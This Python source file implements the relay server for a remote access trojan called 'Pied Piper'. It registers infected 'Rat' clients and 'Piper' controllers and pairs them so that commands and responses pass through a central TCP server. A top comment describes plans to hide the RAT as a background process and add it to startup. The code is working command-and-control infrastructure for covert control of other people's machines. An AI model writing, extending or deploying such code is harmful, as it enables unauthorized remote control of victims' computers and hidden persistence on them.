import socket
import threading
import uuid
from Server import Server

"""
I have to find out how to run RAT as background process without being seen (for gamma)
And add it to start up
"""

class PiedPiperServer(Server):
    def __init__(self, ip, port):
        """
        initiates the main pied piper server object, its data collections and routings
        starts a thread to check which connections are alive
        :param ip:
        :param port:
        """
        self.server_ip = ip
        self.server_port = port
        super().__init__(self.server_ip, self.server_port, 10, self.new_client)
        self.type_by_id = {}  # id:type
        self.socket_by_id = {}  # id:client_socket
        self.address_by_id = {}  # id: address
        self.connections_routing = {}  # id:id
        self.rat_name_by_id = {}  # id:name
        self.available_rats = []  # all names
        # self.open_sockets = []
        self.count_times_connected = 0
        check_open_connections_thread = threading.Thread(target=self.isAliveCheck)
        check_open_connections_thread.start()
        self.init_server()
        print("Initiated server")
        self.run_server()

    """
    this function can prevent a case of unfunctioning rats that stopped working but wont allow 2 different rats on the same pc
    
    def remove_older_rats(self, rat_name):
        for name in self.available_rats:
            if name[:-1] == rat_name[:-1] and name != rat_name:
                id = self.get_key_by_value(self.rat_name_by_id, name)
                self.remove_by_id(id)
                print('removed older rat')
    """

    def show_alive(self):
        """
        shows data collections
        :return:
        """
        print("\nid : type => ", self.type_by_id)
        print("id : socket => ", self.socket_by_id)
        print("id : id => ", self.connections_routing)
        print("id : name => ", self.rat_name_by_id)
        print("available rats => ", self.available_rats, '\n')

    def get_key_by_value(self, dict, value):
        """
        :param dict: dictionary object to search the value at
        :param value: a required value to match the key to
        :return: key of a value OR None if not found
        """
        for key, current_value in dict.items():
            if value == current_value:
                return key

        return None

    def pop_by_value(self, dict, value):
        """
        remove a pair by value
        :param dict: dictionary object to search the value at
        :param value: a required value to match the key to
        """
        for key, current_value in dict.items():
            if value == current_value:
                dict.pop(key)
                return

    def remove_by_id(self, client_id):
        """
        removes a client from all collections by his id
        :param client_id: the id of the required client to remove
        """
        client_type = self.type_by_id[client_id]
        self.type_by_id.pop(client_id)

        if client_type == 'Rat':
            if client_id in self.connections_routing:
                piper_id = self.connections_routing[client_id]
                piper_client = self.socket_by_id[piper_id]
                piper_client.close()
            name = self.rat_name_by_id[client_id]
            self.rat_name_by_id.pop(client_id)
            self.available_rats.remove(name)

        elif client_type == 'Piper':
            rat_id = self.connections_routing[client_id]
            rat_client = self.socket_by_id[rat_id]
            try:
                rat_client.send(b'close')
            except Exception as e:
                print(e)
                print(1)
            self.available_rats.append(self.rat_name_by_id[rat_id])

        # self.socket_by_id.pop(client_id)
        if client_id in self.connections_routing:
            self.connections_routing.pop(client_id)
            self.pop_by_value(self.connections_routing, client_id)

    def isAliveCheck(self):
        """
        iterative check for breathing connections
        :return:
        """
        # self.show_alive()
        # print("is alive checking...")
        sock_ids_to_remove = []
        for sock_id, socket in self.socket_by_id.items():
            try:
                socket.send(b'')
            except:
                try:
                    # print("removing ", self.rat_name_by_id[sock_id])
                    self.remove_by_id(sock_id)
                    sock_ids_to_remove.append(sock_id)
                except Exception as e:
                    print(e)
                    print("In is alive check")

        for curr_id in sock_ids_to_remove:
            self.socket_by_id.pop(curr_id)
            self.address_by_id.pop(curr_id)

        timer = threading.Timer(1, self.isAliveCheck)
        timer.start()

    def disconnect_piper_from_rat(self, client_id):
        """
        disconnect a piper from rat by removing him from routing and announce it to the piper
        :param client_id: required rat to disconnect
        :return:
        """
        rat_id = self.connections_routing[client_id]
        rat_name = self.rat_name_by_id[rat_id]
        self.available_rats.append(rat_name)
        rat_client = self.socket_by_id[rat_id]
        try:
            rat_client.send(b'close')
        except Exception as e:
            print(e)
            print(2)
        # self.socket_by_id.pop(client_id)
        if client_id in self.connections_routing:
            self.connections_routing.pop(client_id)
            self.pop_by_value(self.connections_routing, client_id)

    def connect_piper_to_rat(self, client, client_id):
        """
        connect a piper to a rat by sending him available rats, letting him choose and then add to routing collections
        :param client: socket object
        :param client_id: required client id
        :return:
        """
        chosen_rat = None # I added this line and still did not check if it is bug free
        # send available rats names and wait for him to choose
        while len(self.available_rats) == 0:
            try:
                client.send('0'.encode())
                client.recv(1024)  # ack
            except Exception as e:
                print(e)
                print(3)

        available_rats_string = ','.join(self.available_rats)
        try:
            client.send(available_rats_string.encode())
        except Exception as e:
            print(e)
            print(4)

        try:
            chosen_rat = client.recv(1024)  # rat name
        except Exception as e:
            print(e)
            print(5)

        print(chosen_rat)
        if chosen_rat == b'close':
            self.type_by_id.pop(client_id)
            self.socket_by_id.pop(client_id)
            self.address_by_id.pop(client_id)
            return
        chosen_rat = chosen_rat.decode()
        print("The chosen rat is: ", chosen_rat)
        print("Available rats: ", self.available_rats, ' ', chosen_rat in self.available_rats)
        if chosen_rat not in self.available_rats:
            print("retry to connect to piper by updated availability list")
            try:
                client.send('NotFound'.encode())
            except Exception as e:
                print(e)
                print(6)
            self.type_by_id.pop(client_id)
            self.socket_by_id.pop(client_id)
            self.address_by_id.pop(client_id)
            return
            # self.connect_piper_to_rat(client, client_id)
        rat_id = self.get_key_by_value(self.rat_name_by_id, chosen_rat)
        if rat_id is None:
            print("requested rat not found")
            # need to request again

        self.connections_routing[client_id] = rat_id
        self.connections_routing[rat_id] = client_id
        self.available_rats.remove(chosen_rat)

        try:
            client.send("Initiated Connection To Rat".encode())
        except Exception as e:
            print(e)
            print(7)
        self.start_piper(client, client_id, rat_id)

    def new_client(self, client, client_address):
        """
        welcoming a new client by requesting his details in order to add to routing
        :param client: socket obj
        :param client_address: socket address
        :return:
        """
        print("new client is here")
        new_id = str(uuid.uuid1())
        try:
            client_type = client.recv(1024).decode()  # rat or piper
        except Exception as e:
            print(e)
            print(8)
        self.type_by_id[new_id] = client_type
        self.socket_by_id[new_id] = client
        self.address_by_id[new_id] = client_address

        try:
            client.send(new_id.encode())
            id_ack = client.recv(1024).decode()
        except Exception as e:
            id_ack = '0'
            print(e)
            print(8)

        if id_ack == '0':  # did not get id
            return

        if client_type == 'Piper':
            print("Adding new piper ", new_id)
            self.connect_piper_to_rat(client, new_id)
            # try:
            #     self.connect_piper_to_rat(client, new_id)
            # except Exception as e:
            #     print(e)
            #     print(9)

        if client_type == 'Rat':
            try:
                client.send('What is your name?'.encode())
                rat_name = client.recv(1024).decode()
            except Exception as e:
                rat_name = 'Exception'
                print(e)
                print(10)

            self.count_times_connected += 1
            rat_name += ' #' + str(self.count_times_connected)
            print("Adding rat, ", rat_name)

            #self.remove_older_rats(rat_name)

            self.rat_name_by_id[new_id] = rat_name
            self.available_rats.append(rat_name)
            try:
                client.send('Wait for command'.encode())
            except Exception as e:
                print(e)
                print(11)
            self.start_rat(client, new_id)

    # def start_udp_stream(self, client_id, rat_id):
    #     udp_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
    #     # client_address = self.address_by_id[client_id]
    #     # rat_address = self.address_by_id[rat_id]
    #     client_address = ...
    #     rat_address = ...
    #     udp_socket.bind((self.server_ip, self.server_port))
    #     print("The server is binded")
    #     data, source_address = udp_socket.recvfrom(1024)
    #     print("The data is: ", data, " and the source is: ", source_address)
    #     if data == b'HelloServer,FromPiper':
    #         client_address = source_address
    #     else:
    #         rat_address = source_address
    #
    #     data, source_address = udp_socket.recvfrom(1024)
    #     print("The data is: ", data, " and the source is: ", source_address)
    #     print("I am here")
    #     if data == b'HelloServer,FromRat':
    #         rat_address = source_address
    #     else:
    #         client_address = source_address
    #
    #     udp_socket.sendto(b'confirmed', client_address)
    #     print("sent confirmation to ", client_address)
    #     udp_socket.sendto(b'confirmed', rat_address)
    #     print("sent confirmation to ", rat_address)
    #
    #     if source_address == rat_address and data == b'closed':
    #         udp_socket.sendto(data, client_address)
    #         udp_socket.close()
    #         return
    #
    #
    #     while True:  # i need to decide if disconnect means from rat or from main server
    #         print("keep recv")
    #         data, source_address = udp_socket.recvfrom(20000)
    #         print("The data is: ", data, " and the source is: ", source_address)
    #         print("The data len is: ", len(data))
    #         if source_address == client_address and data == b'close':
    #             print('Client chose to close udp stream')
    #             udp_socket.sendto(data, rat_address)
    #             udp_socket.close()
    #             return
    #         else:
    #             # send
    #             if source_address == client_address:
    #                 udp_socket.sendto(data, rat_address)
    #                 print("sent: ", data, " to: ", rat_address)
    #             elif source_address == rat_address:
    #                 udp_socket.sendto(data, client_address)
    #                 print("sent: ", data, " to: ", client_address)
    #         pass
    #     udp_socket.close()

    def start_piper(self, client, client_id, rat_id):
        """
        start a piper routing of data
        :param client: socket obj of piper
        :param client_id: piper id
        :param rat_id: rat id
        :return:
        """
        data = b''
        rat_client = self.socket_by_id[rat_id]

        """
        response to a command to check available rats
        """
        while True:  # i need to decide if disconnect means from rat or from main server
            try:
                data = client.recv(1024)
            # except ConnectionResetError:
            #     self.remove_by_id(rat_id)
            except Exception as e:
                print(e)

            if data == b'close':
                self.remove_by_id(client_id)
                return
            elif data == b'disconnect rat':
                self.disconnect_piper_from_rat(client_id)
                self.connect_piper_to_rat(client, client_id)
                return

            else:
                try:
                    rat_client.send(data)
                except Exception as e:
                    print(e)

            # client.send("sent to rat".encode())  # need to think if it is ok to send it each time

    def get_route(self, client_id):
        """
        get a route to piper which desire to control the rat
        :param client_id: client unique id
        :return: piper id and piper client or Nones if not found
        """
        piper_id, piper_client = None, None
        worked = False
        while not worked:
            try:
                piper_id = self.connections_routing[client_id]
                piper_client = self.socket_by_id[piper_id]
                worked = True
            except KeyError:
                pass

        return piper_id, piper_client

    def start_rat(self, client, client_id):
        """
        start a rat routing of data
        :param client: socket obj of rat
        :param client_id: rat id
        :return:
        """
        data = b''
        piper_id, piper_client = self.get_route(client_id)
        print(piper_id, ' ', piper_client)
        if piper_id is None:
            return

        while True:  # i need to decide if disconnect means from rat or from main server
            try:
                data = client.recv(1024)
            except Exception as e:
                print(e)
                print(111111111111111111111)
            # print("The rat sent ", data)
            if data == b'closing':
                piper_id, piper_client = self.get_route(client_id)
            else:
                print('rat send: ', data)
                try:
                    piper_client.send(data)
                except OSError:
                    print("OSError")
                    #return
                except Exception as e:
                    print(e)
                    print(22222222222222222222222222)


            # client.send("sent to rat".encode())  # need to think if it is ok to send it each time


def main():
    PiedPiperServer("0.0.0.0", 8200)


if __name__ == "__main__":
    main()
